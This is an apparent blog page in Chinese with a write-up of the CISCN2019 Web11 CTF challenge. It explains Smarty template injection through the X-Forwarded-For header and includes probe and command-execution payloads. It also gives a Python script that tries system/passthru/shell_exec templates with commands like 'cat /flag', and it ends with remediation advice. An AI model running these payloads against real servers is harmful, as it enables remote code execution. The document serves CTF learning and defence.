@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="rowen">
+
+
+
+
+
+<title>CISCN2019 华东南赛区 Web11：Smarty SSTI 题解 | Hexo</title>
+
+
+
+    <link rel="icon" href="/drink.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <!-- 引入jQuery -->
+<script type="text/javascript" src="//libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<!-- 雪花特效2 -->
+ <script type="text/javascript" src="/js/snow2.js"></script>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+<script>
+!
+function() {
+function n(n, e, t) {
+return n.getAttribute(e) || t
+}
+function e(n) {
+return document.getElementsByTagName(n)
+}
+function t() {
+var t = e("script"),
+o = t.length,
+i = t[o - 1];
+return {
+l: o,
+z: n(i, "zIndex", -1), //置于主页面背后
+o: n(i, "opacity", .5), //线条透明度
+c: n(i, "color", "0,0,0"), //线条颜色
+n: n(i, "count", 100) //线条数量
+}
+}
+function o() {
+a = m.width = window.innerWidth ||
+document.documentElement.clientWidth || document.body.clientWidth,
+c = m.height = window.innerHeight ||
+document.documentElement.clientHeight || document.body.clientHeight
+}
+function i() {
+r.clearRect(0, 0, a, c);
+var n, e, t, o, m, l;
+s.forEach(function(i, x) {
+for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 :
+1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1,
+1), e = x + 1; e < u.length; e++) n = u[e],
+null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l
+= o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o,
+i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t /
+2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y),
+r.lineTo(n.x, n.y), r.stroke()))
+}),
+x(i)
+}
+var a, c, u, m = document.createElement("canvas"),
+d = t(),
+l = "c_n" + d.l,
+r = m.getContext("2d"),
+x = window.requestAnimationFrame || window.webkitRequestAnimationFrame
+|| window.mozRequestAnimationFrame || window.oRequestAnimationFrame ||
+window.msRequestAnimationFrame ||
+function(n) {
+window.setTimeout(n, 1e3 / 45)
+},
+w = Math.random,
+y = {
+x: null,
+y: null,
+max: 2e4
+};
+m.id = l,
+m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z +
+";opacity:" + d.o,
+e("body")[0].appendChild(m),
+o(),
+window.onresize = o,
+window.onmousemove = function(n) {
+n = n || window.event,
+y.x = n.clientX,
+y.y = n.clientY
+},
+window.onmouseout = function() {
+y.x = null,
+y.y = null
+};
+for (var s = [], f = 0; d.n > f; f++) {
+var h = w() * a,
+g = w() * c,
+v = 2 * w() - 1,
+p = 2 * w() - 1;
+s.push({
+x: h,
+y: g,
+xa: v,
+ya: p,
+max: 6e3
+})
+}
+u = s.concat([y]),
+setTimeout(function() {
+i()
+},
+100)
+} ();
+</script>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">bobo&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">📖博文</a>
+                
+                    <a class="menu-item" href="/category">📚类别</a>
+                
+                    <a class="menu-item" href="/tag">🏷️标签</a>
+                
+                    <a class="menu-item" href="/about">💡关于</a>
+                
+                    <a class="menu-item" href="/links">🔗友链</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">bobo&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">📖博文</a>
+                
+                    <a class="menu-item" href="/category">📚类别</a>
+                
+                    <a class="menu-item" href="/tag">🏷️标签</a>
+                
+                    <a class="menu-item" href="/about">💡关于</a>
+                
+                    <a class="menu-item" href="/links">🔗友链</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">CISCN2019 华东南赛区 Web11：Smarty SSTI 题解</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">rowen</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">May 20, 2026&nbsp;&nbsp;22:35:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/">比赛复现</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="CISCN2019-华东南赛区-Web11：Smarty-SSTI-题解"><a href="#CISCN2019-华东南赛区-Web11：Smarty-SSTI-题解" class="headerlink" title="CISCN2019 华东南赛区 Web11：Smarty SSTI 题解"></a>CISCN2019 华东南赛区 Web11：Smarty SSTI 题解</h1><h2 id="一、题目信息"><a href="#一、题目信息" class="headerlink" title="一、题目信息"></a>一、题目信息</h2><p>题目页面特征：</p>
+<ul>
+<li>标题为 <code>A Simple Public IP Address API</code></li>
+<li>页面提示 <code>Build With Smarty</code></li>
+<li>暴露接口包括 <code>/api</code>、<code>/xff</code></li>
+</ul>
+<p>从页面信息可以初步判断，这道题和 <code>X-Forwarded-For</code> 请求头以及 Smarty 模板渲染有关。</p>
+<h2 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h2><h3 id="1-可控输入点"><a href="#1-可控输入点" class="headerlink" title="1. 可控输入点"></a>1. 可控输入点</h3><p>题目提供 <code>/xff</code> 接口，业务语义是读取客户端来源 IP。常见实现方式是从 <code>X-Forwarded-For</code> 请求头取值，然后展示到页面中。</p>
+<p>如果后端将请求头中的值直接拼接进模板字符串，再交给模板引擎渲染，就可能触发 SSTI，也就是服务端模板注入。</p>
+<h3 id="2-模板引擎识别"><a href="#2-模板引擎识别" class="headerlink" title="2. 模板引擎识别"></a>2. 模板引擎识别</h3><p>页面中出现：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Build With Smarty</span><br></pre></td></tr></table></figure>
+
+<p>说明后端使用的是 Smarty 模板引擎。Smarty 语法和常见的 Jinja2、Twig 不完全一样，因此 payload 需要围绕 Smarty 的表达式和函数调用方式构造。</p>
+<h3 id="3-利用思路"><a href="#3-利用思路" class="headerlink" title="3. 利用思路"></a>3. 利用思路</h3><p>整体思路如下：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">控制 X-Forwarded-For -&gt; 探测模板表达式 -&gt; 尝试命令执行 -&gt; 读取 flag</span><br></pre></td></tr></table></figure>
+
+<p>探测 payload 可以从以下几类开始：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;$smarty.version&#125;&#125;</span><br><span class="line">&#123;2*5&#125;</span><br><span class="line">&#123;&#123;2*5&#125;&#125;</span><br><span class="line">&#123;php&#125;echo 2333;&#123;/php&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果响应中出现 Smarty 版本、计算结果或明显回显，就说明输入进入了模板渲染流程。</p>
+<h2 id="三、关键利用过程"><a href="#三、关键利用过程" class="headerlink" title="三、关键利用过程"></a>三、关键利用过程</h2><p>脚本自动测试了多个端点：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/</span><br><span class="line">/api</span><br><span class="line">/xff</span><br></pre></td></tr></table></figure>
+
+<p>通过对不同端点发送不同的 <code>X-Forwarded-For</code> 值，判断响应是否发生变化，从而筛选出可能存在注入的位置。</p>
+<p>命令执行阶段使用类似 payload：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;system(&#x27;id&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;system(&#x27;cat /flag&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当模板表达式被执行后，即可读取目标文件。</p>
+<h2 id="四、自动化脚本"><a href="#四、自动化脚本" class="headerlink" title="四、自动化脚本"></a>四、自动化脚本</h2><p>下面脚本用于自动探测端点、发送 SSTI payload，并尝试读取 flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE = <span class="string">&quot;http://target&quot;</span></span><br><span class="line">ENDPOINT_CANDIDATES = [<span class="string">&quot;/xff&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;/api&quot;</span>]</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.timeout = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">probe_payloads = [</span><br><span class="line">    <span class="string">&quot;&#123;&#123;$smarty.version&#125;&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&#123;2*5&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&#123;&#123;2*5&#125;&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&#123;php&#125;echo 2333;&#123;/php&#125;&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rce_templates = [</span><br><span class="line">    <span class="string">&quot;&#123;&#123;system(&#x27;%s&#x27;)&#125;&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&#123;system(&#x27;%s&#x27;)&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&#123;&#123;passthru(&#x27;%s&#x27;)&#125;&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&#123;passthru(&#x27;%s&#x27;)&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&#123;&#123;shell_exec(&#x27;%s&#x27;)&#125;&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&#123;shell_exec(&#x27;%s&#x27;)&#125;&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">commands = [</span><br><span class="line">    <span class="string">&quot;id&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ls&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ls /&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cat /flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cat /flag.txt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cat flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cat /var/www/html/flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;find / -name &#x27;*flag*&#x27; 2&gt;/dev/null | head -n 5&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">FLAG_RE = re.<span class="built_in">compile</span>(<span class="string">r&quot;(flag\&#123;.*?\&#125;|ctf\&#123;.*?\&#125;|FLAG\&#123;.*?\&#125;)&quot;</span>, re.S)</span><br><span class="line">TARGET = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_xff</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="keyword">if</span> TARGET <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="string">&quot;[!] target is not initialized&quot;</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Forwarded-For&quot;</span>: payload,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = session.get(TARGET, headers=headers, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">return</span> resp.status_code, resp.text</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="string">f&quot;[!] request error: <span class="subst">&#123;e&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pick_target</span>():</span><br><span class="line">    marker_a = <span class="string">&quot;1.1.1.1&quot;</span></span><br><span class="line">    marker_b = <span class="string">&quot;2.2.2.2&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> path <span class="keyword">in</span> ENDPOINT_CANDIDATES:</span><br><span class="line">        url = <span class="string">f&quot;<span class="subst">&#123;BASE&#125;</span><span class="subst">&#123;path&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r0 = session.get(url, timeout=<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">if</span> r0.status_code != <span class="number">200</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            h1 = &#123;<span class="string">&quot;X-Forwarded-For&quot;</span>: marker_a, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0&quot;</span>&#125;</span><br><span class="line">            h2 = &#123;<span class="string">&quot;X-Forwarded-For&quot;</span>: marker_b, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0&quot;</span>&#125;</span><br><span class="line">            r1 = session.get(url, headers=h1, timeout=<span class="number">10</span>)</span><br><span class="line">            r2 = session.get(url, headers=h2, timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> marker_a <span class="keyword">in</span> r1.text <span class="keyword">or</span> marker_b <span class="keyword">in</span> r2.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] 发现 XFF 反射端点: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> r1.text != r2.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] 发现可疑端点: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> url</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">global</span> TARGET</span><br><span class="line">    TARGET = pick_target()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> TARGET:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 未自动找到可用注入端点&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Target: <span class="subst">&#123;TARGET&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ssti_ok = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> payload <span class="keyword">in</span> probe_payloads:</span><br><span class="line">        code, text = send_xff(payload)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;payload=<span class="subst">&#123;payload!r&#125;</span>, status=<span class="subst">&#123;code&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> code <span class="keyword">and</span> text:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;2333&quot;</span> <span class="keyword">in</span> text <span class="keyword">or</span> <span class="string">&quot;smarty&quot;</span> <span class="keyword">in</span> text.lower():</span><br><span class="line">                ssti_ok = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r&quot;(^|[^0-9])10([^0-9]|$)&quot;</span>, text):</span><br><span class="line">                ssti_ok = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">match</span> = FLAG_RE.search(text)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] FLAG:&quot;</span>, <span class="keyword">match</span>.group(<span class="number">1</span>))</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ssti_ok:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] 未明显探测到 SSTI，继续尝试 RCE payload&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> template <span class="keyword">in</span> rce_templates:</span><br><span class="line">        <span class="keyword">for</span> command <span class="keyword">in</span> commands:</span><br><span class="line">            payload = template % command.replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">r&quot;\&#x27;&quot;</span>)</span><br><span class="line">            code, text = send_xff(payload)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;template=<span class="subst">&#123;template!r&#125;</span>, command=<span class="subst">&#123;command!r&#125;</span>, status=<span class="subst">&#123;code&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> code <span class="keyword">or</span> <span class="keyword">not</span> text:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">match</span> = FLAG_RE.search(text)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] FLAG:&quot;</span>, <span class="keyword">match</span>.group(<span class="number">1</span>))</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 暂未直接获取 flag&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>使用时修改：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BASE = <span class="string">&quot;http://target&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后运行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 solve.py</span><br></pre></td></tr></table></figure>
+
+<h2 id="五、经验总结"><a href="#五、经验总结" class="headerlink" title="五、经验总结"></a>五、经验总结</h2><p>这道题的关键经验：</p>
+<ul>
+<li>看到 <code>X-Forwarded-For</code> 时，要注意请求头是否被后端信任并展示。</li>
+<li>看到 <code>Build With Smarty</code> 时，要优先想到 Smarty SSTI。</li>
+<li>注入点不一定只在明显的 <code>/xff</code> 接口，也可能在首页或 API 中。</li>
+<li>自动化脚本可以做“多端点 + 多 payload + 多命令”组合，提高命中率。</li>
+</ul>
+<h2 id="六、修复建议"><a href="#六、修复建议" class="headerlink" title="六、修复建议"></a>六、修复建议</h2><p>真实业务中应避免这类问题：</p>
+<ul>
+<li>不要将请求头直接作为可信输入。</li>
+<li>用户可控内容只作为模板变量传入，不要拼接进模板代码。</li>
+<li>对输出内容做 HTML 编码。</li>
+<li>生产环境关闭模板错误回显和调试信息。</li>
+<li>对代理头如 <code>X-Forwarded-For</code> 做可信代理校验。</li>
+</ul>
+<h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h2><p>本题通过 <code>X-Forwarded-For</code> 控制输入，并利用 Smarty 模板渲染触发 SSTI，最终通过模板函数调用读取 flag。它的价值不只是拿到结果，更重要的是帮助理解请求头、模板引擎和服务端渲染之间的安全边界。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>rowen</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://forkmmat.github.io/2026/05/20/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11-Smarty-SSTI%E9%A2%98%E8%A7%A3/">https://forkmmat.github.io/2026/05/20/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11-Smarty-SSTI%E9%A2%98%E8%A7%A3/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Python/"># Python</a>
+                    
+                        <a href="/tags/Web%E5%AE%89%E5%85%A8/"># Web安全</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/SSTI/"># SSTI</a>
+                    
+                        <a href="/tags/Smarty/"># Smarty</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2026/05/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap%E5%8F%82%E6%95%B0%E9%80%83%E9%80%B8%E9%A2%98%E8%A7%A3/">网鼎杯 2020 朱雀组 Nmap：escapeshell 参数逃逸题解</a>
+            
+        </section>
+<script src="https://giscus.app/client.js"
+        data-repo="forkmmat/forkmmat.github.io"
+        data-repo-id="R_kgDOO0OA0g"
+        data-category="General"
+        data-category-id="DIC_kwDOO0OA0s4CtD6Y"
+        data-mapping="title"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="top"
+        data-theme="preferred_color_scheme"
+        data-lang="zh-CN"
+        data-loading="lazy"
+        crossorigin="anonymous"
+        async>
+</script>
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© rowen | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
